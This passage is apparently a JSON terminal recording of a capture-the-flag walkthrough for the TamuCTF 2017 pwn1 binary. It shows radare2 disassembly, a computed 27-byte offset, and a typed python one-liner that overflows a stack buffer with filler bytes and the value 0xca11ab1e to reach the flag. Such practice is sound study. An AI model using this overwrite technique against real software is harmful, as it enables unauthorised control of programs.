+      "\u001b[36m| \u001b[0m\u001b[36m      |   \u001b[0m\u001b[32m0x08048606\u001b[0m      \u001b[37me8\u001b[33m40\u001b[31mff\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.print_flag\u001b[0m\u001b[0m\u001b[31m        ; floating_point rint(arithmetic x)"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     ,==< \u001b[0m\u001b[32m0x0804860b\u001b[0m      \u001b[37meb\u001b[37m10\u001b[0m           \u001b[32mjmp 0x804861d\u001b[0m\u001b[0m"
+    ],
+    [
+      5e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     ||   \u001b[0m   \u001b[31m; JMP XREF from 0x08048604 (main)\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     |`-> \u001b[0m\u001b[32m0x0804860d\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     |    \u001b[0m\u001b[32m0x08048610\u001b[0m      \u001b[33m68\u001b[37mf5\u001b[37m86\u001b[37m04\u001b[37m08\u001b[0m     \u001b[35mpush\u001b[36m \u001b[33mstr.That_is_not_the_secret_word_\u001b[0m\u001b[0m\u001b[31m ; \"That is not the secret word!\" @ 0x80486f5\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     |    \u001b[0m\u001b[32m0x08048615\u001b[0m      \u001b[37me8\u001b[37md6\u001b[37mfd\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     |    \u001b[0m\u001b[32m0x0804861a\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     |    \u001b[0m   \u001b[31m; JMP XREF from 0x0804860b (main)\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     `--> \u001b[0m\u001b[32m0x0804861d\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmov\u001b[36m eax\u001b[0m,\u001b[36m\u001b[33m 0\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.8e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048622\u001b[0m      \u001b[37m8b\u001b[33m4d\u001b[37mfc\u001b[0m         \u001b[37mmov\u001b[36m ecx\u001b[0m,\u001b[36m dword\u001b[36m \u001b[0m[\u001b[36mlocal_4h_2\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048625\u001b[0m      \u001b[37mc9\u001b[0m             \u001b[1;35mleave\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.6e-05,
+      "\r\n"
+    ],
+    [
+      3.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048626\u001b[0m      \u001b[37m8d\u001b[33m61\u001b[37mfc\u001b[0m         \u001b[37mlea\u001b[36m esp\u001b[0m,\u001b[36m \u001b[0m[\u001b[36mecx \u001b"
+    ],
+    [
+      2.7e-05,
+      "[0m-\u001b[36m\u001b[36m 4\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m\\ \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048629\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mret\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "\u001b[0K\r"
+    ],
+    [
+      3.1e-05,
+      "\u001b[0K\r\u001b[33m[0x080485b2]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ?\r\u001b[33m[0x080485b2]>\u001b[0m ?"
+    ],
+    [
+      0.196906,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? \r\u001b[33m[0x080485b2]>\u001b[0m ? "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0\r\u001b[33m[0x080485b2]>\u001b[0m ? 0"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x2\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x2"
+    ],
+    [
+      0.189079,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0"
+    ],
+    [
+      0.182043,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0x\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0x"
+    ],
+    [
+      0.070959,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0xc\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0xc"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m ? 0x27-0xc\r\n27 0x1b 033 27 0000:001b 27 \"\\x1b\" 00011011 27.0 27.000000f 27.000000"
+    ],
+    [
+      6.5e-05,
+      "\r\n\u001b[0K\r"
+    ],
+    [
+      2.9e-05,
+      "\u001b[0K\r\u001b[33m[0x080485b2]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m #\r\u001b[33m[0x080485b2]>\u001b[0m #"
+    ],
+    [
+      0.157905,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # \r\u001b[33m[0x080485b2]>\u001b[0m # "
+    ],
+    [
+      0.366251,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # S\r\u001b[33m[0x080485b2]>\u001b[0m # S"
+    ],
+    [
+      0.304257,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So\r\u001b[33m[0x080485b2]>\u001b[0m # So"
+    ],
+    [
+      0.17596,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So \r\u001b[33m[0x080485b2]>\u001b[0m # So "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So w\r\u001b[33m[0x080485b2]>\u001b[0m # So w"
+    ],
+    [
+      0.052712,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we\r\u001b[33m[0x080485b2]>\u001b[0m # So we"
+    ],
+    [
+      0.099021,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we \r\u001b[33m[0x080485b2]>\u001b[0m # So we "
+    ],
+    [
+      0.224146,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we h\r\u001b[33m[0x080485b2]>\u001b[0m # So we h"
+    ],
+    [
+      0.110044,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we ha\r\u001b[33m[0x080485b2]>\u001b[0m # So we ha"
+    ],
+    [
+      0.154089,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we hav\r\u001b[33m[0x080485b2]>\u001b[0m # So we hav"
+    ],
+    [
+      0.07099,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have\r\u001b[33m[0x080485b2]>\u001b[0m # So we have"
+    ],
+    [
+      0.120188,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have \r\u001b[33m[0x080485b2]>\u001b[0m # So we have "
+    ],
+    [
+      0.173051,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have t\r\u001b[33m[0x080485b2]>\u001b[0m # So we have t"
+    ],
+    [
+      0.076983,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to"
+    ],
+    [
+      0.17615,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to "
+    ],
+    [
+      0.109985,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to w\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to w"
+    ],
+    [
+      0.196002,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to wr\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to wr"
+    ],
+    [
+      0.163188,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to wri\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to wri"
+    ],
+    [
+      0.097144,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to writ\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to writ"
+    ],
+    [
+      0.072867,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write"
+    ],
+    [
+      0.098119,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 2\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 2"
+    ],
+    [
+      0.184835,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 "
+    ],
+    [
+      0.220052,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 c\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 c"
+    ],
+    [
+      0.073989,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 ch\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 ch"
+    ],
+    [
+      0.159205,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 cha\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 cha"
+    ],
+    [
+      0.139995,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 char\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 char"
+    ],
+    [
+      0.145931,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 chara\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 chara"
+    ],
+    [
+      0.129244,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charac\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charac"
+    ],
+    [
+      0.360989,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charace\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charace"
+    ],
+    [
+      0.477464,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charac\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charac"
+    ],
+    [
+      0.18096,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charact\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 charact"
+    ],
+    [
+      0.10513,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characte\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characte"
+    ],
+    [
+      0.126194,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 character\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 character"
+    ],
+    [
+      0.157926,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters"
+    ],
+    [
+      0.216197,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters b\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters b"
+    ],
+    [
+      0.077221,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters be\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters be"
+    ],
+    [
+      0.179832,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters bef\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters bef"
+    ],
+    [
+      0.141022,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters befo\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters befo"
+    ],
+    [
+      0.111002,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters befor\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters befor"
+    ],
+    [
+      0.085133,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before"
+    ],
+    [
+      0.424336,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before w\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before w"
+    ],
+    [
+      0.219967,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before wr\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before wr"
+    ],
+    [
+      0.13693,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before wri\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before wri"
+    ],
+    [
+      0.14313,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writ\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writ"
+    ],
+    [
+      0.125311,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writi\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writi"
+    ],
+    [
+      0.085852,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writin\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writin"
+    ],
+    [
+      0.09294,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing"
+    ],
+    [
+      0.174194,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing "
+    ],
+    [
+      0.294212,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing t\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing t"
+    ],
+    [
+      0.128014,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing th\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing th"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the v\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the v"
+    ],
+    [
+      0.143969,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the va\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the va"
+    ],
+    [
+      0.077014,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the val\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the val"
+    ],
+    [
+      0.074813,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the valu\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the valu"
+    ],
+    [
+      0.051139,
+      "\u001b[0K\r"
+    ],
+    [
+      3.8e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value"
+    ],
+    [
+      0.170018,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value \r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0"
+    ],
+    [
+      0.050761,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0x\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0x"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xc\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xc"
+    ],
+    [
+      0.113106,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca"
+    ],
+    [
+      0.131809,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca1\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca1"
+    ],
+    [
+      0.149079,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11a\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11a"
+    ],
+    [
+      0.126862,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab1\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab1"
+    ],
+    [
+      0.054842,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab1e\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab1e"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m # So we have to write 27 characters before writing the value 0xca11ab1e\r\n\u001b[0K\r"
+    ],
+    [
+      2.6e-05,
+      "\u001b[0K\r\u001b[33m[0x080485b2]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m q\r\u001b[33m[0x080485b2]>\u001b[0m q"
+    ],
+    [
+      0.086262,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m q\r\n"
+    ],
+    [
+      0.0035,
+      "\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
+    ],
+    [
+      0.5,
+      "p"
+    ],
+    [
+      0.104751,
+      "y"
+    ],
+    [
+      0.115122,
+      "t"
+    ],
+    [
+      0.138095,
+      "h"
+    ],
+    [
+      0.080943,
+      "o"
+    ],
+    [
+      0.082099,
+      "n"
+    ],
+    [
+      0.175116,
+      " "
+    ],
+    [
+      0.5,
+      "-"
+    ],
+    [
+      0.192837,
+      "c"
+    ],
+    [
+      0.4123,
+      " "
+    ],
+    [
+      0.5,
+      "'"
+    ],
+    [
+      0.120042,
+      "'"
+    ],
+    [
+      0.488571,
+      "\b"
+    ],
+    [
+      0.5,
+      "p'\b"
+    ],
+    [
+      0.135927,
+      "r'\b"
+    ],
+    [
+      0.5,
+      "i'\b"
+    ],
+    [
+      0.083248,
+      "n'\b"
+    ],
+    [
+      0.060716,
+      "t'\b"
+    ],
+    [
+      0.354369,
+      "('\b"
+    ],
+    [
+      0.033875,
+      ")'\b"
+    ],
+    [
+      0.5,
+      "\b"
+    ],
+    [
+      0.199418,
+      "\")'\b\b"
+    ],
+    [
+      0.161098,
+      "\")'\b\b"
+    ],
+    [
+      0.29455,
+      "\b"
+    ],
+    [
+      0.5,
+      "A\")'\b\b\b"
+    ],
+    [
+      0.271634,
+      "\u001b[C"
+    ],
+    [
+      0.5,
+      "*)'\b\b"
+    ],
+    [
+      0.5,
+      "2)'\b\b"
+    ],
+    [
+      0.192032,
+      "7)'\b\b"
+    ],
+    [
+      0.5,
+      " )'\b\b"
+    ],
+    [
+      0.151874,
+      "+)'\b\b"
+    ],
+    [
+      0.054006,
+      " )'\b\b"
+    ],
+    [
+      0.5,
+      "\")'\b\b"
+    ],
+    [
+      0.15896,
+      "\")'\b\b"
+    ],
+    [
+      0.432458,
+      "\b"
+    ],
+    [
+      0.5,
+      "\\\")'\b\b\b"
+    ],
+    [
+      0.168979,
+      "\\\")'\b\b\b"
+    ],
+    [
+      0.155168,
+      "\\\")'\b\b\b"
+    ],
+    [
+      0.168976,
+      "\\\")'\b\b\b"
+    ],
+    [
+      0.5,
+      "\b"
+    ],
+    [
+      0.139949,
+      "\b"
+    ],
+    [
+      0.149131,
+      "\b"
+    ],
+    [
+      0.371185,
+      "x\\\\\\\")'\b\b\b\b\b\b"
+    ],
+    [
+      0.10712,
+      "\u001b[C"
+    ],
+    [
+      0.127805,
+      "x\\\\\")'\b\b\b\b\b"
+    ],
+    [
+      0.09419,
+      "\u001b[C"
+    ],
+    [
+      0.109013,
+      "x\\\")'\b\b\b\b"
+    ],
+    [
+      0.117984,
+      "\u001b[C"
+    ],
+    [
+      0.092936,
+      "x\")'\b\b\b"
+    ],
+    [
+      0.5,
+      "C\")'\b\b\b"
+    ],
+    [
+      0.117215,
+      "A\")'\b\b\b"
+    ],
+    [
+      0.5,
+      "\b"
+    ],
+    [
+      0.161041,
+      "\b"
+    ],
+    [
+      0.140973,
+      "\b"
+    ],
+    [
+      0.154108,
+      "\b"
+    ],
+    [
+      0.372706,
+      "1\\xCA\")'\b\b\b\b\b\b\b"
+    ],
+    [
+      0.156676,
+      "1\\xCA\")'\b\b\b\b\b\b\b"
+    ],
+    [
+      0.110913,
+      "\b"
+    ],
+    [
+      0.14719,
+      "\b"
+    ],
+    [
+      0.146072,
+      "\b"
+    ],
+    [
+      0.147018,
+      "\b"
+    ],
+    [
+      0.5,
+      "A\\x11\\xCA\")'\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.30326,
+      "B\\x11\\xCA\")'\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.472162,
+      "\b"
+    ],
+    [
+      0.14092,
+      "\b"
+    ],
+    [
+      0.147189,
+      "\b"
+    ],
+    [
+      0.262302,
+      "\b"
+    ],
+    [
+      0.338019,
+      "1\\xAB\\x11\\xCA\")'\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.5,
+      "E\\xAB\\x11\\xCA\")'\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.5,
+      "\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C"
+    ],
+    [
+      0.5,
+      "\r\n"
+    ],
+    [
+      0.111993,
+      "AAAAAAAAAAAAAAAAAAAAAAAAAAA\u001e�\u0011"
+    ],
+    [
+      6.2e-05,
+      "�\r\n"
+    ],
+    [
+      0.002217,
+      "\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
